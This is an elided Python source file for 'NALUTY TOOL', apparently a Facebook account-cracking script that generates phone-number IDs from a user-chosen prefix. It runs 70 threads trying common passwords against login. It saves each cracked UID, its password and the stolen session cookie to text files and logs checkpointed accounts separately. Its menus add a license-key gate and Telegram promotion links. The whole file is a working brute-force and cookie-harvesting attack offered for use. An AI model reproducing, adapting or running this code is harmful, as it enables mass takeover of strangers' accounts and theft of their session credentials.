...
if os.path.exists(filename):
    ...
    other_filename = 'ABNALUTY.txt'
    if os.path.exists(other_filename):
        with open(other_filename, 'r') as other_file:
            other_key = other_file.read().strip()
if key == other_key:
    print("")
else:
	print(f"{GREEN}  TALK TO ADMIN FOR ACTIVATE\n")
	print(f"COPY UR KEY 👇")
	print(f"{WHITE}YOUR KEY :{GREEN}",key)
	time.sleep(10)
	os.system('clear')
	os.system('xdg-open https://t.me/J11IU')
	exit()
from os import path
...
print('\n\033[1;36m[•]   WELCOME TO NALUTY TOOL...');time.sleep(3)
...
|  \/  |/ _ \  / \  |  _ \ 
| |\/| | | | |/ _ \ | | | |
| |  | | |_| / ___ \| |_| |   \033[1;32mNALUTY/SS7\033[1;36m
|_|  |_|\___/_/   \_|____/ 
                               (◉‿◉)  ™
\033[1;37m================= \33[32;45mNALUTY\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mM-TEAM\33[0;m\033[1;32m && \033[1;33mNALUTY\33[0;m
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mNALUTY01
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mFREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mM-TEAM
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36mV3
\033[1;37m================= \33[32;45mTool-V3\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO NALUTY TOOL\33[0;m
 
\033[1;37m================== \33[32;45mLIBYA\33[0;m ======================\n   """)
...
def riaz():
	os.system('clear')
	print(logo)
	print(f'{WHITE}[1] START CRACK ')
	print('[2] FOLLOW MY TELEGRAM')
	print('[0]\x1b[1;91m EXIT ')
	print("")
	print('\33[1;37m===============================================')
	riaz1 = input(f'{WHITE}[•] SELECT OPTION : ')
	if riaz1 =='0':
		exit()
	if riaz1 =='2':
		os.system('xdg-open https://t.me/H12H5')
...
def bangla():
	os.system('clear')
	print(logo)
	print(f'[1] M1{GREEN} [FAST] ')
	print(f'{WHITE}[2] M2{GREEN} [SLOW]{WHITE}')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print(f'{WHITE} SHOSE CODE : {GREEN}21891 21892 21894...{WHITE} ')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print(' LIMIT : 2000,3000,5000,10000')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        tl = str(len(user))
        print(' TOTAL IDS : '+tl)
        print(' YOUR CODE :\x1b[1;92m '+kode)
        print('\x1b[1;92m USE FLIGHT[✈️]MODE FOR SPEED UP')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'١٢٣٤٥٦','١٢٣٤٥٦٧٨','22446688','00998877','77889900','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm']
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'١٢٣٤٥٦','١٢٣٤٥٦٧٨','22446688','00998877','77889900','qwertyuiopasdfghjkl','qwertyuiopzxcvbnm','1133557799','0099887766','qqwweerrtt','qqwweerrttyy','qqwweerrttyyuuiioopp','Aa123456','Aa123123','١١٢٢٣٣٤٤٥٥٦٦','١٢٣٤٥٦٦٥٤٣٢١','091091091','092092092']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mNALUTY-SS7\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[NALUTY-OK] '+cid+' | '+ps+'\033[0;97m\n[‎‎+]\033[1;33m COCKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('NALUTYR-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[NALUTY-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('NALUTYR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
